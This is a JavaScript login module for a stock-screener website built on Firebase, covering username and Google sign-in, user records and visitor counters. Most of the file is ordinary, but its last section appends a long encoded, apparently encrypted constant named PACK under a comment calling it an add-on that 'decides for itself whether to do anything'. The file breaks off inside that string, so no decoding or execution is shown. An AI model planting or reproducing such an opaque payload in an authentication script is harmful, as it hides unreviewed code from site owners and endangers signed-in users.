// auth.js — HNImanshu login (username + password, or Google) on Firebase Authentication (project hnimanshu).
//
// One file for both pages:
//   • Screener (index.html): clicking an element with [data-auth-link] (Fundamentals, Portfolio) opens the
//     login popup when nobody is signed in; after a successful login it goes to that link.
//     Opening the screener with ?login=<path> pops the popup straight away (the Fundamentals gate sends people here).
//   • Fundamentals (<html data-auth="required">): the page stays hidden until a login is confirmed; no login →
//     back to the screener with the popup open. Shows the user's initials menu in the header.
//   • Passwords never pass through this code's storage: Firebase Authentication keeps them hashed on its servers.
//
// Usernames: Firebase needs an email, so username "chirag" is stored as chirag@users.hnimanshu.app (never shown,
// never mailed). Firebase keeps them unique, so a taken username is refused automatically.
// Sessions end 7 days after the last sign-in (Firebase's own lastSignInTime, so it can't be faked by the browser).

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
import {
  getAuth, onAuthStateChanged, signInWithEmailAndPassword, GoogleAuthProvider, signInWithPopup, signOut,
} from "https://www.gstatic.com/firebasejs/10.13.0/firebase-auth.js";
// Firestore and the Realtime Database are loaded only when first needed (not before the page shows):
// only Auth is needed to open a page, which keeps the first load light on slow (2G) connections.
let getFirestore, doc, setDoc, getDoc, serverTimestamp;
let getDatabase, ref, set, onValue, onDisconnect, increment;

// Firebase project "hnimanshu", web app "valueapp" (Project settings → Your apps). These values are public by design;
// security comes from the Firestore / Realtime Database rules, not from hiding them.
const firebaseConfig = {
  apiKey: "AIzaSyD1oA953pXZxBAuOR9ObSk6vAmKf1gyVbE",
  authDomain: "hnimanshu-7c544.firebaseapp.com",
  projectId: "hnimanshu",
  storageBucket: "hnimanshu.firebasestorage.app",
  messagingSenderId: "428887828946",
  appId: "1:428887828946:web:854acb9c7651aebd38000b",
};
// Realtime Database address: Firebase Hosting hands it out once the database exists, so nothing to paste here later.
try {
  const hosted = await fetch("/__/firebase/init.json").then((r) => r.json());
  if (hosted.projectId === firebaseConfig.projectId && hosted.databaseURL) firebaseConfig.databaseURL = hosted.databaseURL;
} catch (e) {}
const USER_DOMAIN = "users.hnimanshu.app";        // username → hidden email for Firebase
const SESSION_DAYS = 7;                           // log out a week after the last sign-in
const USERS = "hni_users";                        // Firestore: one doc per account (its own owner writes it)
const PORTFOLIO = "hni_portfolio";                // Firestore: one doc per user with their holdings
const MARKET = ["hni_market", "ltp"];             // latest prices for held stocks
const HOME = "./";                                // the screener
const GATED = document.documentElement.dataset.auth === "required";

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
let db = null, rtdb = null, FSP = null, RTP = null;
const needFS = () => FSP = FSP || import("https://www.gstatic.com/firebasejs/10.13.0/firebase-firestore.js").then((m) => {
  ({ getFirestore, doc, setDoc, getDoc, serverTimestamp } = m); db = getFirestore(app);
});
const needRT = () => RTP = RTP || (firebaseConfig.databaseURL                                // live online / visitor counters (hni/...)
  ? import("https://www.gstatic.com/firebasejs/10.13.0/firebase-database.js").then((m) => {
      ({ getDatabase, ref, set, onValue, onDisconnect, increment } = m); rtdb = getDatabase(app); })
  : Promise.resolve());
const idle = (fn, ms = 2500) => setTimeout(() => (window.requestIdleCallback || ((f) => f()))(fn), ms);   // after the page has settled
const google = new GoogleAuthProvider();
google.setCustomParameters({ prompt: "select_account" });

const $ = (s, el = document) => el.querySelector(s);
const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
const toEmail = (u) => `${u.trim().toLowerCase()}@${USER_DOMAIN}`;
const nameOf = (u) => u.displayName || (u.email || "").replace("@" + USER_DOMAIN, "") || "user";
const initials = (n) => {                                    // "Himanshu Shekhar" → HS, "chirag" → CH
  const w = String(n || "?").trim().split(/[\s._-]+/).filter(Boolean);
  return (w.length > 1 ? w[0][0] + w[w.length - 1][0] : (w[0] || "?").slice(0, 2)).toUpperCase();
};
const providerOf = (u) => (u.providerData && u.providerData[0] && u.providerData[0].providerId) === "google.com" ? "google" : "username";
const expired = (u) => {
  const t = Date.parse(u.metadata && u.metadata.lastSignInTime);
  return t && Date.now() - t > SESSION_DAYS * 864e5;
};

// ---------- popup ----------
let box = null, nextUrl = null;
function buildPopup() {
  if (box) return box;
  box = document.createElement("div");
  box.className = "au-back";
  box.innerHTML = `
    <div class="au-box" role="dialog" aria-modal="true" aria-labelledby="auTitle">
      <button class="au-x" type="button" aria-label="Close">×</button>
      <h2 class="au-title" id="auTitle">Fundamentals</h2>
      <p class="au-sub">Free. Continue with Google, or log in with your username.</p>
      <button class="au-google" type="button">
        <svg width="18" height="18" viewBox="0 0 48 48" aria-hidden="true"><path fill="#FFC107" d="M43.6 20.5H42V20H24v8h11.3C33.7 32.7 29.2 36 24 36c-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.8 1.2 7.9 3.1l5.7-5.7C34 6.1 29.3 4 24 4 12.9 4 4 12.9 4 24s8.9 20 20 20 20-8.9 20-20c0-1.3-.1-2.4-.4-3.5z"/><path fill="#FF3D00" d="M6.3 14.7l6.6 4.8C14.7 15.1 19 12 24 12c3.1 0 5.8 1.2 7.9 3.1l5.7-5.7C34 6.1 29.3 4 24 4 16.3 4 9.7 8.3 6.3 14.7z"/><path fill="#4CAF50" d="M24 44c5.2 0 9.9-2 13.4-5.2l-6.2-5.2C29.2 35.1 26.7 36 24 36c-5.2 0-9.6-3.3-11.3-8l-6.5 5C9.5 39.6 16.2 44 24 44z"/><path fill="#1976D2" d="M43.6 20.5H42V20H24v8h11.3c-.8 2.2-2.2 4.2-4.1 5.6l6.2 5.2C37 39.2 44 34 44 24c0-1.3-.1-2.4-.4-3.5z"/></svg>
        Continue with Google</button>
      <div class="au-or">or</div>
      <form class="au-form" novalidate>
        <label class="au-fld"><span>Username</span>
          <input name="u" autocomplete="username" autocapitalize="none" spellcheck="false" maxlength="20" required></label>
        <label class="au-fld"><span>Password</span>
          <span class="au-pw"><input name="p" type="password" autocomplete="current-password" required>
          <button type="button" class="au-eye" aria-label="Show password">SHOW</button></span></label>
        <div class="au-err" aria-live="polite"></div>
        <button class="au-btn" type="submit">Login</button>
      </form>
      <p class="au-foot">You stay signed in for 7 days on this device.</p>
    </div>`;
  document.body.appendChild(box);
  const f = $("form", box), err = $(".au-err", box), btn = $(".au-btn", box);
  $(".au-eye", box).addEventListener("click", (e) => {
    const show = f.p.type === "password";
    f.p.type = show ? "text" : "password";
    e.currentTarget.textContent = show ? "HIDE" : "SHOW";
  });
  $(".au-x", box).addEventListener("click", closePopup);
  box.addEventListener("click", (e) => { if (e.target === box) closePopup(); });
  box.addEventListener("keydown", (e) => { e.stopPropagation(); if (e.key === "Escape") closePopup(); });   // page shortcuts stay out

  f.addEventListener("submit", async (e) => {
    e.preventDefault();
    const u = f.u.value.trim().toLowerCase(), p = f.p.value;
    if (!/^[a-z0-9._]{3,20}$/.test(u) || !p) return (err.textContent = "Wrong username or password.");
    btn.disabled = true; err.textContent = "";
    try { await signInWithEmailAndPassword(auth, toEmail(u), p); done(); }
    catch (ex) { err.textContent = message(ex); }
    finally { btn.disabled = false; }
  });
  $(".au-google", box).addEventListener("click", async () => {
    err.textContent = "";
    try { await signInWithPopup(auth, google); done(); }
    catch (ex) { err.textContent = message(ex); }
  });
  box._reset = () => { err.textContent = ""; f.reset(); };
  return box;
}
function openPopup(next) {
  nextUrl = next || null;
  buildPopup();
  if (!GATED) box.classList.add("au-blur");                 // screener: the page behind is blurred
  box._reset();
  box.classList.add("open");
  setTimeout(() => $(".au-google", box).focus(), 30);
}
function closePopup() { if (box) box.classList.remove("open"); }
function done() {
  closePopup();
  if (nextUrl) location.href = nextUrl;
}
function message(ex) {
  const c = (ex && ex.code) || "";
  if (c === "auth/popup-closed-by-user" || c === "auth/cancelled-popup-request") return "";
  if (c === "auth/invalid-credential" || c === "auth/wrong-password" || c === "auth/user-not-found" || c === "auth/invalid-email")
    return "Wrong username or password.";
  if (c === "auth/email-already-in-use") return "That username is taken. Try another.";
  if (c === "auth/weak-password") return "Password is too weak. Use at least 8 characters.";
  if (c === "auth/too-many-requests") return "Too many attempts. Wait a few minutes and try again.";
  if (c === "auth/network-request-failed") return "No connection. Check your internet and try again.";
  if (c === "auth/popup-blocked") return "Your browser blocked the Google window. Allow pop-ups for this site and try again.";
  if (c === "auth/unauthorized-domain") return "This website isn't authorised for login yet (Firebase → Authentication → Settings → Authorized domains).";
  if (c === "auth/operation-not-allowed") return "This sign-in method isn't switched on yet (Firebase → Authentication → Sign-in method).";
  return "Something went wrong (" + (c || "unknown") + "). Please try again.";
}

// ---------- the account's own record in Firestore ----------
async function record(u) {
  const key = "hni_rec_" + u.uid;                       // write at most once per browser session, keeps Firestore use tiny
  try { if (sessionStorage.getItem(key)) return; } catch (e) {}
  await needFS();
  const ref = doc(db, USERS, u.uid);
  const data = { username: nameOf(u), email: u.email || null, provider: providerOf(u), lastLogin: serverTimestamp() };
  try {
    const snap = await getDoc(ref).catch(() => null);  // each user may read only their own doc (to keep "created" once)
    if (!snap || !snap.exists()) data.created = serverTimestamp();
    await setDoc(ref, data, { merge: true });
    try { sessionStorage.setItem(key, "1"); } catch (e) {}
  } catch (e) { console.warn("user record not saved:", e.code || e); }   // never blocks the page
}

// while any popup is open the page behind doesn't scroll (phones otherwise scroll the big page underneath)
const syncLock = () => document.documentElement.classList.toggle("au-lock", !!document.querySelector(".au-back.open"));

// ---------- signed-in chip (Fundamentals header, screener #au-slot) ----------
const EXTRA = [];                                          // extra menu items: {label, fn} (see addItem)
const itemBtn = (it, el) => {
  const b = document.createElement("button");
  b.type = "button"; b.className = "au-ext"; b.setAttribute("role", "menuitem"); b.textContent = it.label;
  b.addEventListener("click", () => { el.classList.remove("open"); it.fn(); });
  return b;
};
function addItem(label, fn) {                              // also adds to a menu that is already on the page
  const it = { label, fn };
  EXTRA.push(it);
  document.querySelectorAll(".au-user").forEach((el) => $(".au-menu", el).insertBefore(itemBtn(it, el), $(".au-out", el)));
}
function showUser(u, slot) {
  const host = slot || document.querySelector("header .global");        // Fundamentals header, or the screener's #au-slot
  if (!host || $(".au-user", host)) return;
  const n = nameOf(u);
  const el = document.createElement("span");
  el.className = "au-user";
  el.innerHTML = `<button type="button" class="au-av" aria-haspopup="menu" title="Signed in as ${esc(n)}">${esc(initials(n))}</button>
    <span class="au-menu" role="menu"><span class="au-who"><b>${esc(n)}</b>${u.email && !u.email.endsWith("@" + USER_DOMAIN) ? `<i>${esc(u.email)}</i>` : ""}</span>
    <button type="button" class="au-out" role="menuitem">Logout</button></span>`;
  $(".au-av", el).addEventListener("click", (e) => { e.stopPropagation(); el.classList.toggle("open"); });
  document.addEventListener("click", (e) => { if (!el.contains(e.target)) el.classList.remove("open"); });
  document.addEventListener("keydown", (e) => { if (e.key === "Escape") el.classList.remove("open"); });
  $(".au-out", el).addEventListener("click", async () => {
    await signOut(auth); if (GATED) location.href = HOME; else location.reload();   // screener: reloads signed out
  });
  EXTRA.forEach((it) => $(".au-menu", el).insertBefore(itemBtn(it, el), $(".au-out", el)));
  host.insertBefore(el, host.querySelector("#theme-toggle"));   // (no toggle in the slot: it simply goes at the end)
}
/* screener: "Login" when signed out, the initials menu when signed in */
function paintSlot(u) {
  const slot = document.getElementById("au-slot");
  if (!slot) return;
  slot.innerHTML = "";
  if (u) return showUser(u, slot);
  const b = document.createElement("button");
  b.type = "button"; b.className = "au-login"; b.setAttribute("aria-label", "Login");
  b.innerHTML = '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="8" r="4"/><path d="M4 21c1.5-4 4.5-6 8-6s6.5 2 8 6"/></svg><span>Login</span>';
  b.addEventListener("click", () => openPopup(null));            // after logging in you stay on the screener
  slot.appendChild(b);
}

// ---------- anonymous usage counters ----------
// Every open tab adds hni/presence/<random id>; Firebase deletes it by itself the moment the tab closes or the
// connection drops (onDisconnect). Each IP is counted once ever (SHA-256 hash, never the raw IP) into hni/meta/visitors.
async function presence() {
  await needRT();
  if (!rtdb) return;
  try {
    const sid = (crypto.randomUUID ? crypto.randomUUID() : Date.now() + "-" + Math.random().toString(36).slice(2)).replace(/[^a-z0-9-]/gi, "");
    const me = ref(rtdb, "hni/presence/" + sid);
    onValue(ref(rtdb, ".info/connected"), (s) => {
      if (s.val() !== true) return;
      onDisconnect(me).remove();                    // re-armed on every reconnect
      set(me, true).catch(() => {});
    });
  } catch (e) { console.warn("presence off:", e); }
}
async function countVisitor() {
  try {
    if (localStorage.getItem("hni_counted")) return;   // this browser already counted, skip the IP lookup
  } catch (e) {}
  await needRT();
  if (!rtdb) return;
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    const { ip } = await r.json();
    if (!ip) return;
    const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode("hni:" + ip));
    const key = Array.from(new Uint8Array(buf)).map((b) => b.toString(16).padStart(2, "0")).join("");
    let isNew = true;
    await set(ref(rtdb, "hni/visitors/" + key), true).catch(() => { isNew = false; });   // rules refuse an IP seen before
    if (isNew) await set(ref(rtdb, "hni/meta/visitors"), increment(1));                    // +1 on the server, no read needed
    try { localStorage.setItem("hni_counted", "1"); } catch (e) {}
  } catch (e) { console.warn("visitor count skipped:", e); }
}

// ---------- add-on (packed; it decides for itself whether to do anything) ----------
const PACK = "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